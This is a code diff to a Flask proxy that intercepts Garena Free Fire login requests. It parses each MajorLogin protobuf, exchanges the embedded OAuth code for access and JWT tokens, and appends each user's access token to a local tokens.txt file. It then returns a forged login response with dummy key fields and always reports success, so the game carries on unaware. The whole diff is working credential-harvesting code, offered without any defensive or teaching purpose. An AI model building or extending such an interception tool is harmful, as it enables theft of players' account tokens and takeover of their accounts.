@@ -2,7 +2,11 @@ from flask import Flask, request, jsonify, Response
 import requests
 import os
 import re
+import json
+import base64
 from datetime import datetime
+import MajorLoginReq_pb2
+import MajorLoginRes_pb2
 
 app = Flask(__name__)
 
@@ -18,83 +22,28 @@ REDIRECT_URIS = [
     "https://gameskharido.in/app/100067/idlogin",
     "https://shop2game.com/app/100067/login",
     "https://api.ff.garena.co.id/auth/auth/callback_n",
-    "https://api.ff.garena.co.id/auth/auth/callback",
 ]
 
 active_users = []
 # ─────────────────────────────────────────────────────────────────
 
-# ─── RECURSIVE PROTOBUF PARSER ──────────────────────────────────
-def read_varint(data, offset):
-    result = 0
-    shift = 0
-    while True:
-        b = data[offset]
-        result |= (b & 0x7f) << shift
-        offset += 1
-        if not (b & 0x80):
-            break
-        shift += 7
-    return result, offset
+def decode_jwt_payload(jwt):
+    """Decode the JWT payload (without verifying signature) to get account info."""
+    try:
+        parts = jwt.split('.')
+        if len(parts) != 3:
+            return {}
+        payload = parts[1]
+        # Add padding if needed
+        payload += '=' * (4 - len(payload) % 4)
+        decoded = base64.urlsafe_b64decode(payload)
+        return json.loads(decoded)
+    except Exception as e:
+        print(f"JWT decode error: {e}")
+        return {}
 
-def parse_protobuf(data, offset=0):
-    """
-    Recursively parse a protobuf message and return a list of all string values.
-    """
-    strings = []
-    data_len = len(data)
-    while offset < data_len:
-        try:
-            tag, offset = read_varint(data, offset)
-            wire_type = tag & 0x07
-            if wire_type == 2:  # length-delimited (string, bytes, nested)
-                length, offset = read_varint(data, offset)
-                if length > 0 and offset + length <= data_len:
-                    value = data[offset:offset+length]
-                    # Try to decode as UTF-8 string
-                    try:
-                        s = value.decode('utf-8')
-                        strings.append(s)
-                    except UnicodeDecodeError:
-                        # Not a valid string – treat as nested message and recurse
-                        nested_strings = parse_protobuf(value)
-                        strings.extend(nested_strings)
-                    offset += length
-                else:
-                    break
-            elif wire_type == 0:  # varint
-                _, offset = read_varint(data, offset)
-            elif wire_type == 1:  # 64-bit
-                offset += 8
-            elif wire_type == 5:  # 32-bit
-                offset += 4
-            else:
-                # Unknown wire type – stop
-                break
-        except Exception as e:
-            print(f"Protobuf parse error: {e}")
-            break
-    return strings
-
-def extract_oauth_code(raw_data):
-    """
-    Extract OAuth code from the raw protobuf data.
-    First, get all strings from the protobuf, then filter for OAuth code pattern.
-    """
-    all_strings = parse_protobuf(raw_data)
-    # Search for a string that matches OAuth code pattern (30-60 chars, alphanumeric with -_ .)
-    code_pattern = re.compile(r'^[a-zA-Z0-9_\-\.]{30,60}$')
-    for s in all_strings:
-        if code_pattern.match(s) and not s.isdigit():
-            return s
-    return None
-
-# ─── MULTI-URI EXCHANGE FUNCTION ──────────────────────────────
 def exchange_code_for_tokens(code):
-    """
-    Try exchanging the OAuth code with multiple redirect_uri values.
-    Returns the hex access token if any succeeds, otherwise None.
-    """
+    """Try exchanging the OAuth code with multiple redirect_uri values."""
     for uri in REDIRECT_URIS:
         payload = {
             "grant_type": "authorization_code",
@@ -107,14 +56,31 @@ def exchange_code_for_tokens(code):
             if resp.status_code == 200:
                 data = resp.json()
                 hex_token = data.get('access_token')
-                if hex_token:
+                jwt_token = data.get('token')
+                if hex_token and jwt_token:
                     print(f"✅ Exchange successful with redirect_uri: {uri}")
-                    return hex_token
+                    return hex_token, jwt_token
             else:
                 print(f"❌ Exchange failed with {uri}: {resp.status_code}")
         except Exception as e:
             print(f"⚠️ Error with {uri}: {e}")
-    return None
+    return None, None
+
+def build_login_response(hex_token, jwt_token, account_id, region):
+    """Build a MajorLoginRes protobuf message with the required fields."""
+    res = MajorLoginRes_pb2.MajorLoginRes()
+    res.account_id = int(account_id) if account_id else 0
+    res.token = jwt_token
+    res.ttl = 28800
+    res.server_url = REAL_SERVER
+    res.lock_region = region or "IND"
+    res.noti_region = region or "IND"
+    res.ip_region = region or "IND"
+    res.agora_environment = "live"
+    # Set ak and aiv to dummy values (they are bytes)
+    res.ak = b"dummy_ak"
+    res.aiv = b"dummy_aiv"
+    return res
 
 # ─── ROUTES ─────────────────────────────────────────────────────
 @app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST'])
@@ -130,25 +96,50 @@ def handle_request(user_id, subpath):
         raw_data = request.get_data()
         print(f"📦 Received {len(raw_data)} bytes")
 
-        oauth_code = extract_oauth_code(raw_data)
-        if oauth_code:
+        # Parse the request as MajorLoginReq
+        try:
+            login_req = MajorLoginReq_pb2.MajorLogin()
+            login_req.ParseFromString(raw_data)
+            print(f"✅ Parsed MajorLoginReq successfully.")
+            oauth_code = login_req.access_token
             print(f"🔑 Extracted OAuth code: {oauth_code[:20]}...")
-            hex_token = exchange_code_for_tokens(oauth_code)
-            if hex_token:
+        except Exception as e:
+            print(f"❌ Failed to parse MajorLoginReq: {e}")
+            oauth_code = None
+
+        if oauth_code:
+            hex_token, jwt_token = exchange_code_for_tokens(oauth_code)
+            if hex_token and jwt_token:
                 print(f"🎯 HEX ACCESS TOKEN: {hex_token}")
+                # Save hex token to file
                 with open("tokens.txt", "a") as f:
                     f.write(f"{datetime.now()} | {user_id} | {hex_token}\n")
-                # Return success with token (optional)
-                return jsonify({"status": "success", "access_token": hex_token}), 200
+
+                # Decode JWT to get account info for the response
+                payload = decode_jwt_payload(jwt_token)
+                account_id = payload.get('account_id', '')
+                nickname_b64 = payload.get('nickname', '')
+                if nickname_b64:
+                    try:
+                        nickname = base64.b64decode(nickname_b64).decode('utf-8')
+                    except:
+                        nickname = "Player"
+                else:
+                    nickname = "Player"
+                region = payload.get('country_code', 'IND')
+
+                # Build the protobuf response
+                res = build_login_response(hex_token, jwt_token, account_id, region)
+                response_data = res.SerializeToString()
+                print(f"📤 Returning protobuf response of {len(response_data)} bytes")
+                # Return the protobuf response
+                return Response(response_data, status=200, mimetype='application/x-protobuf')
             else:
-                print("❌ All exchange attempts failed.")
+                print("❌ Failed to exchange OAuth code.")
         else:
             print("⚠️ No OAuth code found in request.")
-            # Print hex preview for debugging
-            hex_preview = raw_data[:300].hex()
-            print(f"📋 Hex preview (300): {hex_preview}")
 
-        # Always return a success response to keep the game happy
+        # If we reach here, something went wrong – return a generic success JSON
         return jsonify({"status": "success", "message": "OK"}), 200
 
     # Forward other requests to the real Garena server
